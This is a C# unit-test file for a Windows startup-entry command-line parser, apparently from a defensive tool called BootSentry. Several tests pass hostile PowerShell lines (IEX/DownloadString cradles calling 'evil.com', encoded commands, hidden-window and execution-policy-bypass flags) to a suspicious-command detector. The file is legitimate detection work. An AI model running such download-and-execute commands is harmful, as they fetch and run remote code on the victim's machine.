using FluentAssertions;
using Xunit;
using BootSentry.Core.Parsing;

namespace BootSentry.Core.Tests.Parsing;

public class CommandLineParserTests
{
    [Fact]
    public void Parse_WithNullInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse(null);
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithEmptyInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse("");
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithWhitespaceInput_ReturnsNull()
    {
        var result = CommandLineParser.Parse("   ");
        result.Should().BeNull();
    }

    [Fact]
    public void Parse_WithQuotedPath_ExtractsExecutableAndArguments()
    {
        var result = CommandLineParser.Parse("\"C:\\Program Files\\App\\app.exe\" --arg1 --arg2");

        result.Should().NotBeNull();
        result!.Executable.Should().Be("C:\\Program Files\\App\\app.exe");
        result.Arguments.Should().Be("--arg1 --arg2");
    }

    [Fact]
    public void Parse_WithSimplePath_ExtractsExecutable()
    {
        var result = CommandLineParser.Parse("C:\\Windows\\notepad.exe");

        result.Should().NotBeNull();
        result!.Raw.Should().Be("C:\\Windows\\notepad.exe");
    }

    [Fact]
    public void Parse_WithEnvironmentVariable_ExpandsVariable()
    {
        var result = CommandLineParser.Parse("%SystemRoot%\\notepad.exe");

        result.Should().NotBeNull();
        result!.Normalized.ToLowerInvariant().Should().Contain("windows");
        result.Normalized.Should().NotContain("%SystemRoot%");
    }

    [Fact]
    public void Parse_WithEnvironmentVariableDisabled_DoesNotExpand()
    {
        var result = CommandLineParser.Parse("%SystemRoot%\\notepad.exe", expandEnvironmentVariables: false);

        result.Should().NotBeNull();
        result!.Normalized.Should().Contain("%SystemRoot%");
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithEncodedPowerShell_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -enc SGVsbG8gV29ybGQ=");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithDownloadString_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -c \"(New-Object Net.WebClient).DownloadString('http://evil.com')\"");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithNormalCommand_ReturnsFalse()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "\"C:\\Program Files\\App\\app.exe\" --startup");

        suspicious.Should().BeFalse();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithNull_ReturnsFalse()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(null);
        suspicious.Should().BeFalse();
    }

    [Fact]
    public void ExpandEnvironmentVariables_WithSystemRoot_ExpandsCorrectly()
    {
        var result = CommandLineParser.ExpandEnvironmentVariables("%SystemRoot%");
        result.Should().NotContain("%");
        result.ToLowerInvariant().Should().Contain("windows");
    }

    [Fact]
    public void ResolvePath_WithNullInput_ReturnsNull()
    {
        var result = CommandLineParser.ResolvePath(null);
        result.Should().BeNull();
    }

    [Fact]
    public void ResolvePath_WithAbsolutePath_ReturnsSamePath()
    {
        var path = "C:\\Windows\\notepad.exe";
        var result = CommandLineParser.ResolvePath(path);
        result.Should().Be(path);
    }

    [Fact]
    public void ResolvePath_WithEnvironmentVariable_Expands()
    {
        var result = CommandLineParser.ResolvePath("%SystemRoot%\\notepad.exe");
        result.Should().NotBeNull();
        result.Should().NotContain("%");
    }

    // ============================================================
    // Edge case tests for complex Windows command lines
    // ============================================================

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\foo.exe\" /bar \"baz qux\"", "C:\\Program Files\\App\\foo.exe", "/bar \"baz qux\"")]
    [InlineData("\"C:\\Program Files (x86)\\App\\test.exe\" --config=\"my config\"", "C:\\Program Files (x86)\\App\\test.exe", "--config=\"my config\"")]
    [InlineData("C:\\Windows\\System32\\cmd.exe /c dir", "C:\\Windows\\System32\\cmd.exe", "/c dir")]
    public void Parse_WithVariousFormats_ExtractsCorrectly(string input, string expectedExe, string expectedArgs)
    {
        var result = CommandLineParser.Parse(input);

        result.Should().NotBeNull();
        result!.Executable.Should().Be(expectedExe);
        result.Arguments.Should().Be(expectedArgs);
    }

    [Fact]
    public void Parse_WithRundll32_ExtractsCorrectly()
    {
        var result = CommandLineParser.Parse("rundll32.exe shell32.dll,Control_RunDLL");

        result.Should().NotBeNull();
        result!.Executable.ToLowerInvariant().Should().Contain("rundll32");
    }

    [Fact]
    public void Parse_WithEmbeddedQuotes_HandlesCorrectly()
    {
        // Path with escaped quotes inside
        var result = CommandLineParser.Parse("\"C:\\Path With Spaces\\app.exe\" --name=\"John Doe\"");

        result.Should().NotBeNull();
        result!.Executable.Should().Be("C:\\Path With Spaces\\app.exe");
        result.Arguments.Should().Contain("--name=");
    }

    [Fact]
    public void Parse_WithUNCPath_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("\"\\\\server\\share\\app.exe\" --startup");

        result.Should().NotBeNull();
        result!.Executable.Should().Be("\\\\server\\share\\app.exe");
        result.Arguments.Should().Be("--startup");
    }

    [Fact]
    public void Parse_WithCmdStart_HandlesCorrectly()
    {
        // cmd /c "start "" notepad.exe" - common startup pattern
        var result = CommandLineParser.Parse("cmd /c \"start \"\" notepad.exe\"");

        result.Should().NotBeNull();
        result!.Executable.ToLowerInvariant().Should().Contain("cmd");
    }

    [Fact]
    public void Parse_WithMsiexec_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("msiexec.exe /i \"C:\\Path\\setup.msi\" /quiet");

        result.Should().NotBeNull();
        result!.Executable.ToLowerInvariant().Should().Contain("msiexec");
    }

    [Fact]
    public void Parse_WithWscriptCscript_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("wscript.exe \"C:\\Scripts\\startup.vbs\" //nologo");

        result.Should().NotBeNull();
        result!.Executable.ToLowerInvariant().Should().Contain("wscript");
    }

    [Fact]
    public void Parse_WithJavaJar_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("\"C:\\Program Files\\Java\\bin\\java.exe\" -jar \"C:\\App\\app.jar\"");

        result.Should().NotBeNull();
        result!.Executable.Should().Contain("java.exe");
        result.Arguments.Should().Contain("-jar");
    }

    [Fact]
    public void Parse_WithPythonScript_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("python.exe \"C:\\Scripts\\startup.py\" --daemon");

        result.Should().NotBeNull();
        result!.Executable.ToLowerInvariant().Should().Contain("python");
        result.Arguments.Should().Contain("--daemon");
    }

    [Theory]
    [InlineData("%ProgramFiles%\\App\\app.exe")]
    [InlineData("%ProgramFiles(x86)%\\App\\app.exe")]
    [InlineData("%USERPROFILE%\\AppData\\Local\\App\\app.exe")]
    [InlineData("%LOCALAPPDATA%\\App\\app.exe")]
    [InlineData("%APPDATA%\\App\\app.exe")]
    public void Parse_WithCommonEnvironmentVariables_ExpandsCorrectly(string input)
    {
        var result = CommandLineParser.Parse(input);

        result.Should().NotBeNull();
        result!.Normalized.Should().NotContain("%");
    }

    [Fact]
    public void Parse_WithMultipleSpaces_HandlesCorrectly()
    {
        var result = CommandLineParser.Parse("\"C:\\Program Files\\App\\app.exe\"    --arg1    --arg2");

        result.Should().NotBeNull();
        result!.Executable.Should().Be("C:\\Program Files\\App\\app.exe");
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithHiddenFlag_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -WindowStyle Hidden -File script.ps1");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithBypassPolicy_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -ExecutionPolicy Bypass -File script.ps1");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithBase64Invoke_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -e aQBlAHgAIAAoAG4AZQB3AC0A");

        suspicious.Should().BeTrue();
    }

    [Fact]
    public void IsSuspiciousCommandLine_WithScriptBlock_ReturnsTrue()
    {
        var suspicious = CommandLineParser.IsSuspiciousCommandLine(
            "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://x.com/s')\"");

        suspicious.Should().BeTrue();
    }
}
